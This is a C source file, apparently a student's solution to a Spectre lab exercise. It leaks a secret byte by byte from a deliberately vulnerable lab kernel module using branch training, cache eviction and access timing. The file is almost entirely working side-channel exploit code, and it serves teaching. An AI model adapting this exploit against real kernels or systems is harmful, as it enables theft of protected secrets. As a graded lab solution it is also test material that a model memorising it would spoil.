/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#include "labspectreipc.h"
#include "spectre_solution.h"

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uintptr_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory)
{
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;
    CacheStats cache_stats = generate_cache_stats(1000);
    //print_cache_stats(cache_stats);
    printf("Launching attacker\n");
    
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
    {
        char leaked_byte;
        bool found = false;
        while(!found)
        {
            for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
            {
                REPEAT(2) call_kernel_part2(kernel_fd, shared_memory, 0);
                void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
                evict_address(target_addr);
                //REPEAT(10) evict_all_cache();
                call_kernel_part2(kernel_fd, shared_memory, current_offset);
                uint64_t time = time_access(target_addr);
                if (time <= cache_stats.l2 + 20 /*Plus some padding*/) {
                    leaked_byte = (char)i;
                    found = true;
                    break;
                }
            }
        }
        printf("[Part 2] Found char:%c:\n", leaked_byte);
        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);
    destroy_cache_stats(cache_stats);
    close(kernel_fd);
    return EXIT_SUCCESS;
}
